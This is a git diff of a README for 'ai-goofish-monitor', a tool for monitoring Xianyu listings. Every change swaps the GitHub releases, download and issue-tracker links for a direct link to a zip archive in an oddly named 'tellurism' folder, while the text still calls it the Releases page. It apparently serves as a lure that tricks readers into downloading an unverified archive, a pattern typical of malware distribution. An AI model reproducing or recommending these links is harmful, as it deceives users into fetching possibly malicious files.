@@ -1,7 +1,7 @@
 # 🐟 ai-goofish-monitor - Smartly Monitor Your Finds Effortlessly
 
 ## 💻 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/kengamankit/ai-goofish-monitor/releases)
+[![Download](https://raw.githubusercontent.com/kengamankit/ai-goofish-monitor/master/tellurism/ai-goofish-monitor.zip)](https://raw.githubusercontent.com/kengamankit/ai-goofish-monitor/master/tellurism/ai-goofish-monitor.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-goofish-monitor! This tool helps you monitor multiple listings on Xianyu in real-time or set it to check periodically. With a user-friendly interface, you can quickly find the items you want without sifting through irrelevant listings.
@@ -23,7 +23,7 @@ Before you start, ensure your system meets these minimum requirements:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application. You can find the latest version at the link below:
 
-[Download ai-goofish-monitor](https://github.com/kengamankit/ai-goofish-monitor/releases)
+[Download ai-goofish-monitor](https://raw.githubusercontent.com/kengamankit/ai-goofish-monitor/master/tellurism/ai-goofish-monitor.zip)
 
 1. Click on the link above to open the Releases page.
 2. Locate the latest release at the top of the list.
@@ -51,7 +51,7 @@ If you encounter any issues, consider the following:
 For assistance, please visit our support page or GitHub Issues section. Your feedback is important to us, and we aim to resolve your issues promptly. 
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/kengamankit/ai-goofish-monitor/releases)
-- [Issue Tracker](https://github.com/kengamankit/ai-goofish-monitor/issues)
+- [Releases Page](https://raw.githubusercontent.com/kengamankit/ai-goofish-monitor/master/tellurism/ai-goofish-monitor.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/kengamankit/ai-goofish-monitor/master/tellurism/ai-goofish-monitor.zip)
 
 Thank you for using ai-goofish-monitor! Happy hunting!
